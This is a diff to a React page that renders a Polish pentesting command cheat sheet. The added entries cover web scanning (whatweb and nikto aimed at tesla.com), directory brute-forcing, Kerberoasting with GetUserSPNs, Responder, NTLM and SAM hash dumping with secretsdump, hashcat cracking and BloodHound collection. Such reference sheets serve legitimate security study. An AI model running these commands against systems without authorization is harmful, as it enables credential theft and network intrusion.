@@ -74,6 +74,15 @@ const Commends = () => {
             </details>
 
             <details>
+                <summary>WHATWEB</summary>
+                 <h4 className='important'>whatweb https://tesla.com</h4>
+            </details>
+            <details>
+                <summary>NIKTO</summary>
+                 <h4 className='important'>nikto -h http://tesla.com</h4>
+            </details>
+
+            <details>
                 <summary>WHOIS</summary>
                 <ul>
                     <li>
@@ -195,7 +204,47 @@ const Commends = () => {
                     </tbody>
                 </table>
             </details>
+
+            <details>
+                <summary>dirbuster</summary>
+                <p>Kompleksowe narzędzie do wyliczania plików na stronie.</p>
+                <table>
+                    <thead>
+                        <tr>
+                        <th>Komenda</th>
+                        <th>Opis</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                        <td>dirbuster&</td>
+                        <td>włączenie narzędzia (okienkowe)</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </details>
             
+            <details>
+                <summary>feroxbuster</summary>
+                <p>Wielozadaniowe narzędzie często używane do brutalnego wymuszania katalogów/plików, ale także skuteczne do wykrywania hostów wirtualnych.</p>
+                <table>
+                    <thead>
+                        <tr>
+                        <th>Komenda</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                        <td>feroxbuster -u (http://target_IP_address) -w (wordlist_file)</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div className='waring'>
+                    <p>W nowszych wersjach Gobustera flaga --append-domain jest wymagana w celu dołączenia domeny bazowej do każdego słowa na liście słów podczas wykrywania hosta wirtualnego. Ta flaga zapewnia, że ​​Gobuster poprawnie konstruuje pełne wirtualne nazwy hostów, co jest niezbędne do dokładnego wyliczenia potencjalnych subdomen. W starszych wersjach Gobuster ta funkcjonalność była obsługiwana inaczej i flaga --append-domain nie była konieczna. Użytkownicy starszych wersji mogą uznać tę flagę za niedostępną lub potrzebną, ponieważ narzędzie domyślnie dołączało domenę bazową lub wykorzystywało inny mechanizm generowania hosta wirtualnego.</p>
+                </div>
+            </details>
+
             <details>
                 <summary>gobuster</summary>
                 <p>Wielozadaniowe narzędzie często używane do brutalnego wymuszania katalogów/plików, ale także skuteczne do wykrywania hostów wirtualnych.</p>
@@ -234,6 +283,14 @@ const Commends = () => {
                         <tr>
                             <td>Odkrywanie katalogów</td>
                             <td>ffuf -w directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</td>
+                        </tr>
+                        <tr>
+                            <td>Zapytania request (Pamiętać by w pliku była zmienna FUZZ!!)</td>
+                            <td>ffuf -w directory-list-2.3-small.txt:FUZZ -request {'<Plik z requestem>'}</td>
+                        </tr>
+                        <tr>
+                            <td>Zapytania request każdy z każdym w zależności od ilości zmiennych(Pamiętać by w pliku była zmienne np: FUZZ1 i FUZZ2 !!)</td>
+                            <td>ffuf -w directory-list-2.3-small.txt:FUZZ1 -w directory-list-2.3-small.txt:FUZZ2 -request {'<Plik z requestem>'} -mode clusterbomb</td>
                         </tr>
                         <tr>
                             <td>Odkrywanie drzewa subkatalogów o głębokości 1</td>
@@ -1704,6 +1761,10 @@ const Commends = () => {
                             <td>python3 ./secretsdump.py -sam sam.save -system system.save LOCAL</td>
                             <td>Wyciąganie credential z plików sam, system</td>
                         </tr>
+                        <tr>
+                            <td>python3 ./secretsdump.py {'<Domena>'}/{'<User name>'}:{'<Password>'}@{'<IP>'} -just-dc-ntlm</td>
+                            <td>Wyciąganie credential z NTLM</td>
+                        </tr>
            
                     </tbody>
                 </table>
@@ -1730,6 +1791,10 @@ const Commends = () => {
                         <tr>
                             <td>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</td>
                             <td>Odhashowanie bitlocker hash file</td>
+                        </tr>
+                        <tr>
+                            <td>hashcat -m 13100 kerberos.txt /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt</td>
+                            <td>Odhashowanie kerberos hash file</td>
                         </tr>
                     </tbody>
                 </table>
@@ -1787,6 +1852,83 @@ const Commends = () => {
                         <tr>
                             <td>./chisel server --reverse -v -p 1234 --socks5</td>
                             <td>Włączenie chisela po naszej stronie</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </details>
+
+            <details>
+                <summary>Responder</summary>
+             
+                <table>
+                    <thead>
+                        <tr>
+                        <th>Komenda</th>
+                        <th>Opis</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>responder -I {'<Nazwa interface>'}</td>
+                            <td>Nasłuchiwanie połączeń</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </details>
+
+            <details>
+                <summary>GetUserSPNs.py</summary>
+                <table>
+                    <thead>
+                        <tr>
+                        <th>Komenda</th>
+                        <th>Opis</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>GetUserSPNs.py {'<Domena>'}/{'<User>'}:{'<Password>'} -dc-ip {'<IP>'} -request</td>
+                            <td>Wyszukiwanie oraz zwrot userów z Kerberos</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </details>
+
+            <details>
+                <summary>secretsdump.py</summary>
+                <table>
+                    <thead>
+                        <tr>
+                        <th>Komenda</th>
+                        <th>Opis</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>secretsdump.py {'<Domena>'}/{'<User>'}:{'<Password>'}@{'<IP>'}</td>
+                            <td>Zwraca userów oraz hashe SAM w domenie</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </details>
+
+            <details>
+                <summary>bloodhound</summary>
+                <table>
+                    <thead>
+                        <tr>
+                        <th>Komenda</th>
+                        <th>Opis</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>bloodhound</td>
+                            <td>Otwiera aplikację</td>
+                        </tr>
+                        <tr>
+                            <td>bloodhound-python -d {'<Domena>'} -u {'<User>'} -p {'<Password>'} -ns {'<IP>'} -c all </td>
+                            <td>Zebranie wszystkich danych z domeny</td>
                         </tr>
                     </tbody>
                 </table>
